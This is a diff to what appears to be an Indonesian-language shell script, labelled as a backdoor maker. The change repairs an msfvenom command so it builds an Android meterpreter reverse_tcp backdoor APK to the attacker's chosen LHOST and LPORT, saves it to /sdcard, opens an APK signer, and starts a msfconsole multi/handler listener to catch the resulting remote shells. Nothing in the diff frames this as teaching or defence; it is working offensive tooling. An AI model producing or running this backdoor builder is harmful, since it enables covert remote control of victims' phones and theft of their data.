@@ -155,7 +155,7 @@ ulang(){
 ulang="s"
 while [ $ulang = "s" ];
 do
-        sleep 0.01
+        sleep 0.02
 done
 }
 
@@ -187,7 +187,10 @@ echo
 clear
 echo $hijau "MEMBUAT BACKDOOR .. PLEASE WAIT ...."
 sleep 1
-msfvenom -p "use android/meterpreter/reverde_tcp LHOST $lh LPORT $lp -o $nama.apk"
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o /sdcard/$nama.apk
+sleep 0.1
+am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity
+sleep 0.1
 clear
 fungsi
 }
@@ -214,7 +217,9 @@ echo
 read -p "Masukan LPORT kalian : " lport;
 echo
 echo $ungu "EKSEKUSI . WAITING......"
+sleep 0.1
 msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $tun0;set LPORT $lport;exploit;"
+sleep 0.1
 clear
 fungsi
 }
